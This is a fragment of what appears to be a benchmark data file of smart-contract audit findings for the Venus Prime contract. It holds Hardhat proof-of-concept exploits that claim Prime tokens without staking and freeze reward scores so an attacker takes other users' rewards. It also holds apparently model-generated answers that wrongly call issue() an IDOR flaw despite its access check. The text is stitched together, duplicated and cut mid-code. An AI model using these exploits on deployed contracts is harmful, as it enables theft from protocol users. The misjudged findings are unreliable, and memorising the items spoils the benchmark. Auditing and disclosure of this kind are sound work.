This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

The reason is that the `issue` function includes a call to `_checkAccessAllowed(\"issue(bool,address[])\")` at the beginning, which presumably implements access control checks to ensure only authorized users can call this function. This prevents unauthorized users from manipulating references to internal objects and thus mitigates the risk of IDOR vulnerabilities.\n\nHowever, it is important to note that the vulnerability assessment assumes that the `_checkAccessAllowed` function is implemented correctly and provides adequate access control checks. If the `_checkAccessAllowed` function contains errors or insufficient checks, then the smart contract code may still be vulnerable to IDOR or other security issues. Therefore, it is essential to carefully review and test the implementation of all security-related functions to ensure the smart contract's overall security.",
                "poc_patch": "Answer: Yes, the given smart contract code is vulnerable to an Insecure Direct Object Reference (IDOR) vulnerability.\n\nType of vulnerability: The vulnerability is an IDOR since the contract does not perform proper access control checks for the 'issue' function, which allows users to upgrade or mint tokens.\n\nReason: The 'issue' function calls '_upgrade' and '_mint' functions without checking if the caller has the appropriate permissions to perform these operations. This lack of access control checks can lead to unauthorized actions, such as token transfers or modification of critical state variables. For example, an attacker can manipulate the 'users' array and call the 'issue' function to mint or upgrade tokens for any address, even if they are not authorized to do so.\n\nProof of Concept (PoC):\n\nConsider an attacker who wants to mint tokens for an unauthorized address 'victimAddress'. The attacker can craft a transaction with the following parameters:\n\ncontractAddress.issue(false, [victimAddress]);\n\nThis transaction will call the 'issue' function with 'isIrrevocable' set to false and an array containing the 'victimAddress'. The contract will then execute the '_mint' and '_initializeMarkets' functions for the 'victimAddress' without checking if the caller is authorized to perform these actions.\n\nPatch:\n\nTo mitigate the IDOR vulnerability, implement rigorous access control checks in the 'issue' function. Before calling '_upgrade' or '_mint', ensure that the caller has the appropriate permissions to perform these operations. For instance, you can introduce a 'TokenManager' contract with a 'canUpgrade' and 'canMint' modifier to validate user permissions:\n\ncontract TokenManager {\n   modifier canUpgrade(address user) {\n       // Perform access control checks here\n       _;\n   }\n\n   modifier canMint(address user) {\n       // Perform access control checks here\n       _;\n   }\n}\n\ncontract Token is TokenManager {\n   function issue(bool isIrrevocable, address[] calldata users) external {\n       _checkAccessAllowed(\"issue(bool,address[])\");\n\n       if (isIrrevocable) {\n           for (uint256 i = 0; i",

The assessment relies on the assumption that the `_checkAccessAllowed` function is correctly implemented and adequately enforces the access controls. If, however, the `_checkAccessAllowed` function is flawed or has weaknesses, the smart contract could potentially still be susceptible to IDOR or other security issues.

Specifically, the function does not validate the calling party's permissions before executing the '_upgrade' and '_mint' functions, allowing manipulation of the 'users' array and token operations for any address. To address this, it is recommended to implement access controls like 'canUpgrade' and 'canMint' modifiers in a 'TokenManager' contract to enforce proper permissions before these sensitive operations can be conducted.",

Since the code does not contain any price feed-related functionality, there is no need to modify the code to mitigate the price feed vulnerability. Instead, if the smart contract were to be extended to include price feeds, then the recommended approach to mitigate the vulnerability would be to introduce a scheduled minting/burning query and make the execution of minting or redeeming tokens conditional based on price thresholds, as mentioned in the knowledge.

This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

        "gtraw": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

